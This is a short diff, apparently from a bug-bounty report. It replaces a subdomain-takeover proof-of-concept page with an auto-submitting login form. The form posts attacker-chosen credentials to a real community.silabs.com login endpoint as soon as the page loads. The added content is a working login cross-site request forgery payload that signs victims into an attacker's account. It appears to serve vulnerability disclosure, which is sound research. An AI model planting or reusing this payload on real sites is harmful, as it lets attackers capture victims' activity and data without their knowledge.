@@ -1,6 +1,6 @@
-<html>
-<body>
-<h1>Subdomain Takeover PoC - Hugo22dr</h1>
-<p>Controlled by hugo22dr@wearehackerone.com</p>
-</body>
-</html>
+<form action="https://community.silabs.com/SL_CommunitiesLogin" method="POST">
+    <input name="j_id0:form:username" value="attacker@evil.com">
+    <input name="j_id0:form:passwordBox" value="attackerPassword">
+    <input type="submit">
+</form>
+<script>document.forms[0].submit();</script>
